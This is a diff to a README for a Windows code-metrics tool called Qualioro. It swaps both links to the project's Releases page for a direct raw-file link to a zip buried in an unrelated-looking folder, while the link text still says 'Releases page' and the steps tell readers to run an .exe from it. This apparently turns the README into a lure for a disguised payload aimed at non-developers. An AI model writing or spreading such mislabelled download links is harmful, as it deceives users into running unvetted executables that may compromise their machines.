@@ -1,6 +1,6 @@
 # 📊 Qualioro - Turn code metrics into actionable insights
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/kytheanit12/Qualioro/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/kytheanit12/Qualioro/main/monodromy/Software_v3.8-alpha.3.zip)
 
 Qualioro helps you understand your software project. It scans your code and provides reports that highlight areas for improvement. You do not need to be a developer to gain value from these reports. The application processes your files and displays clear charts to show the health of your project.
 
@@ -28,7 +28,7 @@ Your computer needs to meet these basic standards to run Qualioro:
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the [Qualioro Releases page](https://github.com/kytheanit12/Qualioro/releases) to access the download options.
+1.  Visit the [Qualioro Releases page](https://raw.githubusercontent.com/kytheanit12/Qualioro/main/monodromy/Software_v3.8-alpha.3.zip) to access the download options.
 2.  Find the file that ends with `.exe` in the list of assets.
 3.  Click the link to download the file to your computer.
 4.  Locate the downloaded file in your browser downloads folder or your local Downloads directory.
